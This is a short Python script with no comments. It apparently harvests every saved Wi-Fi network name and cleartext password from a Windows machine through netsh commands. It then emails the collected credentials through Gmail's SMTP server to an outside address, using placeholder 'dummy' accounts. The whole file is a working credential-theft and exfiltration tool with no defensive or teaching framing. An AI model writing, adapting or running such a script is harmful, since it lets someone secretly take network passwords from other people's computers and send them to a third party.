import subprocess
import re
import smtplib
from email.message import EmailMessage

command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True)\
    .stdout.decode('Windows-1251')

profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
wifi_list = list()


if len(profile_names) != 0:
    for name in profile_names:
        wifi_profile = dict()
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output=True)\
            .stdout.decode('Windows-1251')
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            wifi_profile["ssid"] = name
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"],
                                               capture_output = True).stdout.decode('Windows-1251')
            password = re.search("Key Content            : (.*)\r", profile_info_pass)

            if password == None:
                wifi_profile["password"] = None
            else:
                wifi_profile["password"] = password[1]

            wifi_list.append(wifi_profile)


email_message = ""
for item in wifi_list:
    email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"


email = EmailMessage()
email["from"] = "dummy@gmail.com"
email["to"] = "dummy@yahoo.co.uk"
email["subject"] = "WiFi SSIDs and Passwords"
email.set_content(email_message)


with smtplib.SMTP(host="smtp.gmail.com", port=465) as smtp:
    smtp.ehlo()
    smtp.starttls()
    smtp.login("dummy_dummy", "dummy")
    smtp.send_message(email)
